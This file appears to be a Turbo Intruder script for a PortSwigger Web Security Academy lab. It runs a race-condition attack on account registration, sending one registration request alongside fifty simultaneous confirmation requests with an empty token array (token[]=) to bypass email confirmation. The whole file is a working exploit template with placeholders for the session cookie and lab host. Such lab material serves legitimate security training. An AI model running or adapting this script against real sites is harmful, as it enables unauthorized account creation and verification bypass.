def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    # replace your `phpsessionid` session cookie in here
    confirmTokenRequest = '''POST /confirm?token[]= HTTP/2
Host: .web-security-academy.net
Cookie: phpsessionid=
Content-Length: 0

'''
    MIN_ATTEMPT = 1
    MAX_ATTEMPT = 20
    for usernamePrefix in range(MIN_ATTEMPT, MAX_ATTEMPT):
        currentQueue = 'queue' + str(usernamePrefix)
        # prepare 1 registration request
        engine.queue(target.req, str(usernamePrefix), gate=currentQueue)

        # prepare x number of confirm token requests
        CONFIRM_REQUEST_NUMBER = 50
        for confirmRequest in range(CONFIRM_REQUEST_NUMBER):
            engine.queue(confirmTokenRequest, gate=currentQueue)

        # send all prepared requests at the same time
        engine.openGate(currentQueue)

def handleResponse(req, interesting):
    table.add(req)
